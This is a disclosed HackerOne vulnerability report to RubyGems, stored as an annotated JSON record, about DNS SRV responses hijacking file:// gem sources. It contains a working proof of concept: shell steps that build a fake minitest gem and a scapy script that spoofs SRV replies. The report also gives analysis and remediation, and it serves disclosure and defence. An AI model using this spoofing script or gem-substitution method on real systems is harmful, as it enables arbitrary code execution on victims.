{
  "reported_to": "RubyGems",
  "reported_by": "plover ",
  "title": "DNS SRV lookup of file:// sources enables local hijacking of gems",
  "content": "\nSummary\ngem makes a DNS SRV query for each of its configured sources; the response is allowed to override the source URL in certain ways. The SRV query happens not only for http:// and https:// sources, but also for s3:// and file://. In the case of file://, the SRV response may add a prefix to the local filesystem path from which gems are fetched. As a consequence, an attacker who can provide or spoof DNS responses, and can write to the local filesystem, may cause a victim to download fake gems with arbitrary contents.\nDemonstration\nHere is how an attacker may hijack a victim's installation of the minitest gem. The users attacker and victim share the same local filesystem. victim expects to install gems from /home/victim/trusted-gem-path, but attacker will force the installation to be from /tmp/attack/home/victim/trusted-gem-path instead.\nFirst, victim sets up a file:// repo. This could also be done by some other party, like a local administrator.\nCode 228 Bytes\n1victim$ mkdir -p /home/victim/trusted-gem-path/gems\n2victim$ (cd /home/victim/trusted-gem-path/gems && gem fetch --clear-sources --source https://rubygems.org/ minitest)\n3victim$ gem generate_index -d /home/victim/trusted-gem-path\nThen attacker makes a malicious gem file and installs it under a prefix where attacker can write and victim can read. We'll use /tmp/attack.\nCode 538 Bytes\n1# Make a malicious gem\n2attacker$ mkdir lib\n3attacker$ echo 'puts \"hacked\"' > lib/hacked.rb\n4attacker$ cat <<EOF > hacked.gemspec\n5Gem::Specification.new do |s|\n6  s.name = 'minitest'\n7  s.version = '5.11.3'\n8  s.files = ['lib/hacked.rb']\n9end\n10EOF\n11attacker$ gem build --force hacked.gemspec \n12# Make it available under /tmp/attack\n13attacker$ mkdir -p /tmp/attack/home/victim/trusted-gem-path/gems\n14attacker$ cp minitest-5.11.3.gem /tmp/attack/home/victim/trusted-gem-path/gems\n15attacker$ gem generate_index -d /tmp/attack/home/victim/trusted-gem-path\nNext, attacker runs a program to spoof SRV responses. This will require root privileges if run on the same host, but it could also be done from another host in the same local network. The attacker may even control the local DNS, for example by being the wi-fi admin.\nCode 767 Bytes\n1#!/usr/bin/env python3\n2\n3from scapy.all import *\n4\n5TARGET = b\"xxx./tmp/attack\"\n6\n7def respond(pkt):\n8    if not (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):\n9        return\n10    q = pkt[DNSQR]\n11    # Nothing after \"_rubygems._tcp.\" indicates that the host is empty;\n12    # i.e., that it's likely a lookup for a file:// URL. 33 == SRV.\n13    if not (q.qname == b\"_rubygems._tcp.\" and q.qtype == 33):\n14        return\n15    resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) \\\n16        / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) \\\n17        / DNS(qr=1, id=pkt[DNS].id, qd=q, ancount=1) \\\n18        / DNSRRSRV(type=33, rrname=q.qname, ttl=30, priority=0, weight=1, port=80, rdlen=8+len(TARGET), target=TARGET)\n19    send(resp)\n20\n21sniff(filter=\"udp dst port 53\", prn=respond)\nFinally, victim tries to fetch a gem and specifically asks for their previously configured file:// source. attacker's SRV response adds a /tmp/attack prefix and victim ends up with a malicious gem.\nCode 168 Bytes\n1victim$ gem fetch --clear-sources --source file:///home/victim/trusted-gem-path minitest\n2victim$ tar -O -xf minitest-5.11.3.gem -- data.tar.gz | tar tzf -\n3lib/hacked.rb\nAnalysis\nThe api_endpoint function takes a URL, extracts the host component, and then issues a SRV query for _rubygems._tcp.#{host}. Its usual purpose is to replace \"rubygems.org\" with \"api.rubygems.org\" in http:// and https:// URLs; but it is also called for s3:// and file:// URLs. In a typical file:// URL, the host component is empty, so the query will be for _rubygems._tcp..\napi_endpoint has the property that it allows limited control of parts of the URL other than the host component: in particular you can add a prefix to the path component by including / characters in the SRV response. The attack works by sending a SRV response of xxx./tmp/attack. The xxx. can be anything, as long as it ends with a . in order to pass the subdomain check. Receiving such a response, api_endpoint transforms the input URL\nCode 36 Bytes\n1file:///home/victim/trusted-gem-path\ninto the output URL\nCode 51 Bytes\n1file://xxx./tmp/attack/home/victim/trusted-gem-path\nIn the output URL, the xxx. is technically the host component, but it doesn't matter because it is ignored.\nThe conditions for exploitation seem fairly narrow:\nThe victim and attacker must share a filesystem.\nThe attacker must know the path to the victim's file:// repo.\nThe attacker must anticipate the name of a gem that the victim will install.\nThe attacker must be able to provide DNS responses.\nI don't know how common such conditions are. While gem supports file:// sources, I wasn't able to find much information on configuring them other than one bug report. It seems it's more common to do a shared repository over http than using a shared filesystem. Commit 37d486cfd9 says \"bundler gemspecs use file:// URIs for their sources,\" but I could not find in Bundler where that happens.\nRemediation\nThe best solution seems to be not to call api_endpoint for file:// (and s3://) URLs. The host component of such URLs doesn't have the same meaning as it does in http:// and https:// URLs.\nA mitigation that in this case would be sufficient would be to apply stricter validation of SRV responses, not allowing them to modify any components other than the host (GitHub #2035, HackerOne #274267).\nImpact\nThe CVSS calculator says the severity is \"high\" but I would put it at \"low\" because of the difficulty of execution. The impact is indeed bad: arbitrary code execution using the victim's privileges, whether through Ruby code or a C extension. But as far as I can tell, the conditions for exploitation are uncommon.\n\n",
  "severity": [
    7.2,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1544564040,
  "report_url": "https://hackerone.com/reports/411519",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "victim$ mkdir -p /home/victim/trusted-gem-path/gems"
    ],
    [
      2,
      "victim$ (cd /home/victim/trusted-gem-path/gems && gem fetch --clear-sources --source https://rubygems.org/ minitest)"
    ],
    [
      3,
      "victim$ gem generate_index -d /home/victim/trusted-gem-path"
    ],
    [
      4,
      "attacker$ mkdir lib"
    ],
    [
      5,
      "attacker$ echo 'puts \"hacked\"' > lib/hacked.rb"
    ],
    [
      6,
      "attacker$ cat <<EOF > hacked.gemspec"
    ],
    [
      7,
      "attacker$ gem build --force hacked.gemspec"
    ],
    [
      8,
      "attacker$ mkdir -p /tmp/attack/home/victim/trusted-gem-path/gems"
    ],
    [
      9,
      "attacker$ cp minitest-5.11.3.gem /tmp/attack/home/victim/trusted-gem-path/gems"
    ],
    [
      10,
      "attacker$ gem generate_index -d /tmp/attack/home/victim/trusted-gem-path"
    ],
    [
      11,
      "attacker$ python3 spoof_srv.py"
    ],
    [
      12,
      "victim$ gem fetch --clear-sources --source file:///home/victim/trusted-gem-path minitest"
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to hijack a victim's gem installation by manipulating DNS SRV responses for file:// sources, leading to arbitrary code execution by forcing the victim to download malicious gems from a manipulated local filesystem path.",
  "reason": "This vulnerability involves multiple components: DNS SRV spoofing, local filesystem manipulation, and understanding of gem's source URL handling. The interaction between DNS responses and file:// URL processing is subtle and non-obvious, requiring deep knowledge of both DNS and Ruby gem internals.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "274267"
}